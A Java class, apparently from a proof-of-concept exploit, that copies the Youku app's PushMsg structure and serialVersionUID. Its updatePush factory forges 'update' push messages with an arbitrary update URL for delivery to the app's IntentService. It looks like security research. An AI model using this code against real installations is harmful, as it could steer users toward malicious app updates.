package com.youku.service.push;

import java.io.Serializable;

/**
 * 与优酷 com.youku.phone 内 PushMsg 字段对齐，用于跨进程 Serializable extra。
 * 目标类没有手写 serialVersionUID，运行时算出的值是 729042640670041695。
 * 这里必须写同一个值，否则对端 ObjectInputStream 会抛 InvalidClassException 并弄崩 IntentService。
 * 实例字段名和类型需与目标一致；UID 对齐后按字段名还原，多出来的方法不影响反序列化。
 */
public class PushMsg implements Serializable {

    private static final long serialVersionUID = 729042640670041695L;

    public static final int TYPE_UPDATE = 1;

    public String cls_name;
    public String com_app_name;
    public String content;
    public String desc;
    public String game_id;
    public String game_type;
    public String icon;
    public String imageurl;
    public String img;
    public String live_id;
    public String md5;
    public String mid;
    public String pkg_name;
    public String showId;
    public String showname;
    public String title;
    public String toast_img;
    public String toast_msg;
    public int type;
    public String updatecontent;
    public String updateurl;
    public String updateversion;
    public String url;
    public int ver_code;
    public String ver_name;
    public String videoid;
    public String view_type;

    public static PushMsg updatePush(String updateUrl, String version, String updateContent) {
        PushMsg pushMsg = new PushMsg();
        pushMsg.type = TYPE_UPDATE;
        pushMsg.updateurl = updateUrl;
        pushMsg.updateversion = version;
        pushMsg.updatecontent = updateContent;
        pushMsg.title = "PoC";
        pushMsg.content = "PoC";
        return pushMsg;
    }
}
